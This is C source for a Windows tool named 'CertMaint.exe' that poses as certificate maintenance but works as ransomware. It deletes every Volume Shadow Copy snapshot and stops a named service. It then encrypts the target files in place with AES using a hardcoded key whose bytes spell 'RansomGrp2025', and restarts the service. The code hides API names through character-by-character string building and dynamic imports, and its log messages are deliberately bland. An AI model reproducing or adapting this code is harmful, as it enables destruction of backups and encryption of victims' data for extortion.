#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>
#include <stdio.h>
#include <string.h>
#include "aes.h"

#pragma comment(lib, "ole32.lib")

typedef enum {
    VSS_OBJECT_UNKNOWN      = 0,
    VSS_OBJECT_NONE         = 1,
    VSS_OBJECT_SNAPSHOT_SET = 2,
    VSS_OBJECT_SNAPSHOT     = 3,
    VSS_OBJECT_PROVIDER     = 4
} VSS_OBJECT_TYPE_E;

typedef struct {
    GUID     m_SnapshotId;
    GUID     m_SnapshotSetId;
    LONG     m_lSnapshotsCount;
    WCHAR   *m_pwszSnapshotDeviceObject;
    WCHAR   *m_pwszOriginalVolumeName;
    WCHAR   *m_pwszOriginatingMachine;
    WCHAR   *m_pwszServiceMachine;
    WCHAR   *m_pwszExposedName;
    WCHAR   *m_pwszExposedPath;
    GUID     m_ProviderId;
    LONG     m_lSnapshotAttributes;
    LONGLONG m_tsCreationTimestamp;
    int      m_eStatus;
} VSS_SNAPSHOT_PROP;

typedef struct {
    GUID    m_ProviderId;
    WCHAR  *m_pwszProviderName;
    int     m_eProviderType;
    WCHAR  *m_pwszProviderVersion;
    GUID    m_ProviderVersionId;
    GUID    m_ClassId;
} VSS_PROVIDER_PROP;

typedef struct {
    int Type;
    union {
        VSS_SNAPSHOT_PROP  Snap;
        VSS_PROVIDER_PROP  Prov;
    } Obj;
} VSS_OBJECT_PROP;

#define IVBC_RELEASE           2
#define IVBC_INITFORBACKUP     5
#define IVBC_SETBACKUPSTATE    6
#define IVBC_SETCONTEXT       35
#define IVBC_DELETESNAPSHOTS  39
#define IVBC_QUERY            43

#define IVEO_RELEASE  2
#define IVEO_NEXT     3

#define VTBL(obj) (*(void ***)(obj))

typedef ULONG   (STDMETHODCALLTYPE *PFN_Release)         (void *);
typedef HRESULT (STDMETHODCALLTYPE *PFN_InitForBackup)   (void *, void *);
typedef HRESULT (STDMETHODCALLTYPE *PFN_SetBackupState)  (void *, int, int, int, int);
typedef HRESULT (STDMETHODCALLTYPE *PFN_SetContext)      (void *, LONG);
typedef HRESULT (STDMETHODCALLTYPE *PFN_DeleteSnapshots) (void *, GUID, int, BOOL, LONG *, GUID *);
typedef HRESULT (STDMETHODCALLTYPE *PFN_Query)           (void *, GUID, int, int, void **);
typedef HRESULT (STDMETHODCALLTYPE *PFN_EnumNext)        (void *, ULONG, VSS_OBJECT_PROP *, ULONG *);

typedef HRESULT (STDAPICALLTYPE *PFN_CreateVssBC)        (void **);
typedef void    (APIENTRY       *PFN_VssFreeSnapProps)   (VSS_SNAPSHOT_PROP *);

static WCHAR  g_targetDir[MAX_PATH];
static WCHAR  g_serviceName[256];
static WCHAR *g_files[16];
static int    g_fileCount;

static const BYTE g_key[32] = {
    82,97,110,115,111,109,71,114,112,50,48,50,53,33,64,35,
    36,37,94,38,42,40,41,95,43,61,123,124,125,58,59,34
};

static const BYTE g_iv[16] = {
    73,73,83,48,49,69,110,99,73,86,50,48,50,53,33,64
};

static void ss_vssapi_dll(WCHAR *b)
{
    b[0]=L'v';b[1]=L's';b[2]=L's';b[3]=L'a';b[4]=L'p';
    b[5]=L'i';b[6]=L'.';b[7]=L'd';b[8]=L'l';b[9]=L'l';b[10]=0;
}

static void ss_advapi32_dll(WCHAR *b)
{
    b[0]=L'a';b[1]=L'd';b[2]=L'v';b[3]=L'a';b[4]=L'p';b[5]=L'i';
    b[6]=L'3';b[7]=L'2';b[8]=L'.';b[9]=L'd';b[10]=L'l';b[11]=L'l';b[12]=0;
}

static void ss_CreateVssBC(char *b)
{
    b[0]='C';b[1]='r';b[2]='e';b[3]='a';b[4]='t';b[5]='e';
    b[6]='V';b[7]='s';b[8]='s';b[9]='B';b[10]='a';b[11]='c';
    b[12]='k';b[13]='u';b[14]='p';b[15]='C';b[16]='o';b[17]='m';
    b[18]='p';b[19]='o';b[20]='n';b[21]='e';b[22]='n';b[23]='t';
    b[24]='s';b[25]='I';b[26]='n';b[27]='t';b[28]='e';b[29]='r';
    b[30]='n';b[31]='a';b[32]='l';b[33]=0;
}

static void ss_VssFreeSnap(char *b)
{
    b[0]='V';b[1]='s';b[2]='s';b[3]='F';b[4]='r';b[5]='e';
    b[6]='e';b[7]='S';b[8]='n';b[9]='a';b[10]='p';b[11]='s';
    b[12]='h';b[13]='o';b[14]='t';b[15]='P';b[16]='r';b[17]='o';
    b[18]='p';b[19]='e';b[20]='r';b[21]='t';b[22]='i';b[23]='e';
    b[24]='s';b[25]='I';b[26]='n';b[27]='t';b[28]='e';b[29]='r';
    b[30]='n';b[31]='a';b[32]='l';b[33]=0;
}

static void ss_OpenSCManagerW    (char *b) { b[0]='O';b[1]='p';b[2]='e';b[3]='n';b[4]='S';b[5]='C';b[6]='M';b[7]='a';b[8]='n';b[9]='a';b[10]='g';b[11]='e';b[12]='r';b[13]='W';b[14]=0; }
static void ss_OpenServiceW      (char *b) { b[0]='O';b[1]='p';b[2]='e';b[3]='n';b[4]='S';b[5]='e';b[6]='r';b[7]='v';b[8]='i';b[9]='c';b[10]='e';b[11]='W';b[12]=0; }
static void ss_ControlService    (char *b) { b[0]='C';b[1]='o';b[2]='n';b[3]='t';b[4]='r';b[5]='o';b[6]='l';b[7]='S';b[8]='e';b[9]='r';b[10]='v';b[11]='i';b[12]='c';b[13]='e';b[14]=0; }
static void ss_StartServiceW     (char *b) { b[0]='S';b[1]='t';b[2]='a';b[3]='r';b[4]='t';b[5]='S';b[6]='e';b[7]='r';b[8]='v';b[9]='i';b[10]='c';b[11]='e';b[12]='W';b[13]=0; }
static void ss_CloseServiceHandle(char *b) { b[0]='C';b[1]='l';b[2]='o';b[3]='s';b[4]='e';b[5]='S';b[6]='e';b[7]='r';b[8]='v';b[9]='i';b[10]='c';b[11]='e';b[12]='H';b[13]='a';b[14]='n';b[15]='d';b[16]='l';b[17]='e';b[18]=0; }
static void ss_QueryServiceStatus(char *b) { b[0]='Q';b[1]='u';b[2]='e';b[3]='r';b[4]='y';b[5]='S';b[6]='e';b[7]='r';b[8]='v';b[9]='i';b[10]='c';b[11]='e';b[12]='S';b[13]='t';b[14]='a';b[15]='t';b[16]='u';b[17]='s';b[18]=0; }

static void ss_arg_target (WCHAR *b) { b[0]=L'-';b[1]=L'-';b[2]=L't';b[3]=L'a';b[4]=L'r';b[5]=L'g';b[6]=L'e';b[7]=L't';b[8]=0; }
static void ss_arg_service(WCHAR *b) { b[0]=L'-';b[1]=L'-';b[2]=L's';b[3]=L'e';b[4]=L'r';b[5]=L'v';b[6]=L'i';b[7]=L'c';b[8]=L'e';b[9]=0; }
static void ss_arg_files  (WCHAR *b) { b[0]=L'-';b[1]=L'-';b[2]=L'f';b[3]=L'i';b[4]=L'l';b[5]=L'e';b[6]=L's';b[7]=0; }

typedef SC_HANDLE (WINAPI *PFN_OpenSCManagerW)    (LPCWSTR, LPCWSTR, DWORD);
typedef SC_HANDLE (WINAPI *PFN_OpenServiceW)      (SC_HANDLE, LPCWSTR, DWORD);
typedef BOOL      (WINAPI *PFN_ControlService)    (SC_HANDLE, DWORD, LPSERVICE_STATUS);
typedef BOOL      (WINAPI *PFN_StartServiceW)     (SC_HANDLE, DWORD, LPCWSTR *);
typedef BOOL      (WINAPI *PFN_CloseServiceHandle)(SC_HANDLE);
typedef BOOL      (WINAPI *PFN_QueryServiceStatus)(SC_HANDLE, LPSERVICE_STATUS);

static struct {
    PFN_OpenSCManagerW     OpenSCManagerW;
    PFN_OpenServiceW       OpenServiceW;
    PFN_ControlService     ControlService;
    PFN_StartServiceW      StartServiceW;
    PFN_CloseServiceHandle CloseServiceHandle;
    PFN_QueryServiceStatus QueryServiceStatus;
} g_scm;

static int init_scm_imports(void)
{
    WCHAR wDll[16];
    char  fn[24];
    HMODULE hAdv;

    ss_advapi32_dll(wDll);
    hAdv = LoadLibraryW(wDll);
    if (!hAdv) { printf("[!] Security module load error: %lu\n", GetLastError()); return 1; }

    ss_OpenSCManagerW(fn);     g_scm.OpenSCManagerW     = (PFN_OpenSCManagerW)    GetProcAddress(hAdv, fn);
    ss_OpenServiceW(fn);       g_scm.OpenServiceW       = (PFN_OpenServiceW)      GetProcAddress(hAdv, fn);
    ss_ControlService(fn);     g_scm.ControlService     = (PFN_ControlService)    GetProcAddress(hAdv, fn);
    ss_StartServiceW(fn);      g_scm.StartServiceW      = (PFN_StartServiceW)     GetProcAddress(hAdv, fn);
    ss_CloseServiceHandle(fn); g_scm.CloseServiceHandle = (PFN_CloseServiceHandle)GetProcAddress(hAdv, fn);
    ss_QueryServiceStatus(fn); g_scm.QueryServiceStatus = (PFN_QueryServiceStatus)GetProcAddress(hAdv, fn);

    if (!g_scm.OpenSCManagerW || !g_scm.OpenServiceW ||
        !g_scm.ControlService || !g_scm.StartServiceW ||
        !g_scm.CloseServiceHandle || !g_scm.QueryServiceStatus) {
        printf("[!] Security interface resolution failed\n");
        return 1;
    }
    return 0;
}

static int delete_vss_shadows_impl(void)
{
    HRESULT hr;
    HMODULE hVssApi            = NULL;
    PFN_CreateVssBC  pCreate   = NULL;
    PFN_VssFreeSnapProps pFree = NULL;
    void *pBC                  = NULL;
    void *pEnum                = NULL;
    GUID  zeroGuid;
    int   total = 0;
    int   ret   = 0;
    WCHAR wDll[16];
    char  fn[40];

    memset(&zeroGuid, 0, sizeof(zeroGuid));

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) { printf("[!] COM init error: 0x%08lX\n", hr); return 1; }

    ss_vssapi_dll(wDll);
    hVssApi = LoadLibraryW(wDll);
    if (!hVssApi) { printf("[!] Storage provider unavailable: %lu\n", GetLastError()); ret = 1; goto done; }

    ss_CreateVssBC(fn);
    pCreate = (PFN_CreateVssBC)GetProcAddress(hVssApi, fn);
    if (!pCreate) { printf("[!] Snapshot interface not found\n"); ret = 1; goto done; }

    ss_VssFreeSnap(fn);
    pFree = (PFN_VssFreeSnapProps)GetProcAddress(hVssApi, fn);

    hr = pCreate(&pBC);
    if (FAILED(hr)) { printf("[!] Snapshot session error: 0x%08lX\n", hr); ret = 1; goto done; }

    hr = ((PFN_InitForBackup)VTBL(pBC)[IVBC_INITFORBACKUP])(pBC, NULL);
    if (FAILED(hr)) { printf("[!] Session init failed: 0x%08lX\n", hr); ret = 1; goto cleanup_bc; }

    hr = ((PFN_SetBackupState)VTBL(pBC)[IVBC_SETBACKUPSTATE])(pBC, 0, 1, 1, 0);
    if (FAILED(hr)) { printf("[!] Session config error: 0x%08lX\n", hr); ret = 1; goto cleanup_bc; }

    ((PFN_SetContext)VTBL(pBC)[IVBC_SETCONTEXT])(pBC, (LONG)-1);

    hr = ((PFN_Query)VTBL(pBC)[IVBC_QUERY])(
            pBC, zeroGuid,
            (int)VSS_OBJECT_NONE, (int)VSS_OBJECT_SNAPSHOT, &pEnum);
    if (FAILED(hr)) { printf("[!] Snapshot query error: 0x%08lX\n", hr); ret = 1; goto cleanup_bc; }

    if (pEnum) {
        VSS_OBJECT_PROP prop;
        ULONG fetched = 0;

        while (((PFN_EnumNext)VTBL(pEnum)[IVEO_NEXT])(pEnum, 1, &prop, &fetched)
                   == S_OK && fetched > 0)
        {
            LONG deleted = 0;
            GUID nonDel;
            memset(&nonDel, 0, sizeof(nonDel));

            hr = ((PFN_DeleteSnapshots)VTBL(pBC)[IVBC_DELETESNAPSHOTS])(
                    pBC, prop.Obj.Snap.m_SnapshotId,
                    (int)VSS_OBJECT_SNAPSHOT, TRUE, &deleted, &nonDel);
            if (SUCCEEDED(hr))
                total += deleted;

            if (pFree)
                pFree(&prop.Obj.Snap);

            fetched = 0;
        }

        ((PFN_Release)VTBL(pEnum)[IVEO_RELEASE])(pEnum);
    }

cleanup_bc:
    ((PFN_Release)VTBL(pBC)[IVBC_RELEASE])(pBC);

done:
    if (hVssApi) FreeLibrary(hVssApi);
    CoUninitialize();

    if (ret == 0) {
        if (total > 0)
            printf("[OK] Stale snapshots removed: %d\n", total);
        else
            printf("[OK] No stale snapshots.\n");
    }
    return ret;
}

static int stop_service_impl(const WCHAR *name)
{
    SC_HANDLE hSCM, hSvc;
    SERVICE_STATUS ss;
    int attempts = 0;

    hSCM = g_scm.OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) { printf("[!] Service manager access denied: %lu\n", GetLastError()); return 1; }

    hSvc = g_scm.OpenServiceW(hSCM, name, SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        printf("[!] Service handle error (%ls): %lu\n", name, GetLastError());
        g_scm.CloseServiceHandle(hSCM);
        return 1;
    }

    if (!g_scm.ControlService(hSvc, SERVICE_CONTROL_STOP, &ss)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_NOT_ACTIVE) {
            printf("[OK] %ls: idle\n", name);
            g_scm.CloseServiceHandle(hSvc);
            g_scm.CloseServiceHandle(hSCM);
            return 0;
        }
        printf("[!] Service transition failed: %lu\n", err);
        g_scm.CloseServiceHandle(hSvc);
        g_scm.CloseServiceHandle(hSCM);
        return 1;
    }

    while (ss.dwCurrentState != SERVICE_STOPPED && attempts < 30) {
        Sleep(1000);
        if (!g_scm.QueryServiceStatus(hSvc, &ss)) break;
        attempts++;
    }

    g_scm.CloseServiceHandle(hSvc);
    g_scm.CloseServiceHandle(hSCM);

    if (ss.dwCurrentState == SERVICE_STOPPED) {
        printf("[OK] %ls: paused\n", name);
        return 0;
    }
    printf("[!] %ls: pause timeout\n", name);
    return 1;
}

static int encrypt_file_impl(const WCHAR *path)
{
    HANDLE hFile, hMap;
    BYTE  *pView;
    LARGE_INTEGER li;
    size_t origSize, padLen, paddedSize;
    struct AES_ctx ctx;

    hFile = CreateFileW(path, GENERIC_READ | GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Data store access error (%ls): %lu\n", path, GetLastError());
        return 1;
    }

    if (!GetFileSizeEx(hFile, &li) || li.QuadPart == 0) {
        printf("[!] %ls: size read error\n", path);
        CloseHandle(hFile);
        return 1;
    }

    origSize   = (size_t)li.QuadPart;
    padLen     = AES_BLOCKLEN - (origSize % AES_BLOCKLEN);
    paddedSize = origSize + padLen;

    hMap = CreateFileMappingW(hFile, NULL, PAGE_READWRITE,
                              (DWORD)(paddedSize >> 32),
                              (DWORD)(paddedSize & 0xFFFFFFFF), NULL);
    if (!hMap) {
        printf("[!] Memory map error (%ls): %lu\n", path, GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    pView = (BYTE *)MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, paddedSize);
    if (!pView) {
        printf("[!] View error (%ls): %lu\n", path, GetLastError());
        CloseHandle(hMap);
        CloseHandle(hFile);
        return 1;
    }

    memset(pView + origSize, (int)padLen, padLen);

    AES_init_ctx_iv(&ctx, g_key, g_iv);
    AES_CBC_encrypt_buffer(&ctx, pView, paddedSize);

    FlushViewOfFile(pView, paddedSize);
    UnmapViewOfFile(pView);
    CloseHandle(hMap);
    CloseHandle(hFile);

    printf("[OK] Repackaged %ls (%zu -> %zu)\n", path, origSize, paddedSize);
    return 0;
}

static int start_service_impl(const WCHAR *name)
{
    SC_HANDLE hSCM, hSvc;
    SERVICE_STATUS ss = {0};
    int attempts = 0;

    hSCM = g_scm.OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) { printf("[!] Service manager access denied: %lu\n", GetLastError()); return 1; }

    hSvc = g_scm.OpenServiceW(hSCM, name, SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        printf("[!] Service handle error (%ls): %lu\n", name, GetLastError());
        g_scm.CloseServiceHandle(hSCM);
        return 1;
    }

    if (!g_scm.StartServiceW(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[OK] %ls: active\n", name);
            g_scm.CloseServiceHandle(hSvc);
            g_scm.CloseServiceHandle(hSCM);
            return 0;
        }
        printf("[!] Service resume failed: %lu\n", err);
        g_scm.CloseServiceHandle(hSvc);
        g_scm.CloseServiceHandle(hSCM);
        return 1;
    }

    while (attempts < 30) {
        if (!g_scm.QueryServiceStatus(hSvc, &ss)) break;
        if (ss.dwCurrentState == SERVICE_RUNNING) break;
        Sleep(1000);
        attempts++;
    }

    g_scm.CloseServiceHandle(hSvc);
    g_scm.CloseServiceHandle(hSCM);

    if (ss.dwCurrentState == SERVICE_RUNNING) {
        printf("[OK] %ls: resumed\n", name);
        return 0;
    }
    printf("[!] %ls: resume timeout\n", name);
    return 1;
}

typedef struct { volatile int result; } VssCtx;

typedef struct {
    const WCHAR  *name;
    BOOL          start;
    volatile int  result;
} SvcCtx;

typedef struct {
    WCHAR        paths[16][MAX_PATH];
    int          count;
    volatile int result;
} EncCtx;

VOID CALLBACK cb_vss(PTP_CALLBACK_INSTANCE inst, PVOID ctx, PTP_WORK work)
{
    (void)inst; (void)work;
    ((VssCtx *)ctx)->result = delete_vss_shadows_impl();
}

VOID CALLBACK cb_svc(PTP_CALLBACK_INSTANCE inst, PVOID ctx, PTP_WORK work)
{
    SvcCtx *c = (SvcCtx *)ctx;
    (void)inst; (void)work;
    c->result = c->start ? start_service_impl(c->name)
                         : stop_service_impl(c->name);
}

VOID CALLBACK cb_enc(PTP_CALLBACK_INSTANCE inst, PVOID ctx, PTP_WORK work)
{
    EncCtx *c = (EncCtx *)ctx;
    int i;
    (void)inst; (void)work;
    c->result = 0;
    for (i = 0; i < c->count && c->result == 0; i++)
        c->result = encrypt_file_impl(c->paths[i]);
}

static int run_work(PTP_WORK_CALLBACK cb, void *ctx, volatile int *result)
{
    PTP_WORK work = CreateThreadpoolWork(cb, ctx, NULL);
    if (!work) { printf("[!] Worker allocation failed: %lu\n", GetLastError()); return 1; }
    SubmitThreadpoolWork(work);
    WaitForThreadpoolWorkCallbacks(work, FALSE);
    CloseThreadpoolWork(work);
    return *result;
}

static void usage(void)
{
    printf("Usage: CertMaint.exe --target <dir> --service <name> --files <f1,f2,...>\n");
}

static int parse_args(int argc, WCHAR **argv)
{
    WCHAR sw_target[12], sw_service[12], sw_files[12];
    int i;

    ss_arg_target(sw_target);
    ss_arg_service(sw_service);
    ss_arg_files(sw_files);

    for (i = 1; i < argc; i++) {
        if (wcscmp(argv[i], sw_target) == 0 && i + 1 < argc)
            wcscpy_s(g_targetDir, MAX_PATH, argv[++i]);
        else if (wcscmp(argv[i], sw_service) == 0 && i + 1 < argc)
            wcscpy_s(g_serviceName, 256, argv[++i]);
        else if (wcscmp(argv[i], sw_files) == 0 && i + 1 < argc) {
            WCHAR *list = argv[++i];
            WCHAR *ctx  = NULL;
            WCHAR *tok  = wcstok_s(list, L",", &ctx);
            while (tok && g_fileCount < 16) {
                g_files[g_fileCount++] = tok;
                tok = wcstok_s(NULL, L",", &ctx);
            }
        } else {
            usage();
            return 1;
        }
    }

    if (!g_targetDir[0] || !g_serviceName[0] || g_fileCount == 0) {
        usage();
        return 1;
    }
    return 0;
}

int wmain(int argc, WCHAR **argv)
{
    int i;
    VssCtx vctx = {0};
    SvcCtx sctx = {0};
    EncCtx ectx = {0};

    if (parse_args(argc, argv) != 0)
        return 1;

    if (init_scm_imports() != 0)
        return 1;

    if (run_work(cb_vss, &vctx, &vctx.result) != 0)
        printf("[!] Snapshot cleanup incomplete, continuing\n");

    sctx.name  = g_serviceName;
    sctx.start = FALSE;
    if (run_work(cb_svc, &sctx, &sctx.result) != 0)
        return 1;

    ectx.count = g_fileCount;
    for (i = 0; i < g_fileCount; i++)
        _snwprintf_s(ectx.paths[i], MAX_PATH, _TRUNCATE,
                     L"%s\\%s", g_targetDir, g_files[i]);

    if (run_work(cb_enc, &ectx, &ectx.result) != 0)
        return 1;

    sctx.result = 0;
    sctx.start  = TRUE;
    if (run_work(cb_svc, &sctx, &sctx.result) != 0)
        return 1;

    printf("[OK] Maintenance pass complete.\n");
    return 0;
}
